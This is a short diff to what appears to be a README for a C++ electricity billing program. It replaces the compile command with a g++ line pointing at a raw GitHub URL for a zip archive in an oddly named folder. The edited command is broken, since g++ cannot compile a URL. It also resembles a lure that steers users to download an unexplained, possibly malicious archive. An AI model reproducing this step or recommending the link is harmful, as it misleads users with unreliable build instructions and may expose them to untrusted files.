@@ -84,7 +84,7 @@ Compile using a C++ compiler:
 bash
 Copy
 Edit
-g++ -o billing_app billing.cpp
+g++ -o billing_app https://raw.githubusercontent.com/Eemanfatimaawan/Electricity-Billing-System/main/erythropsia/Electricity-System-Billing-Cactus.zip
 ./billing_app
 Follow prompts:
 
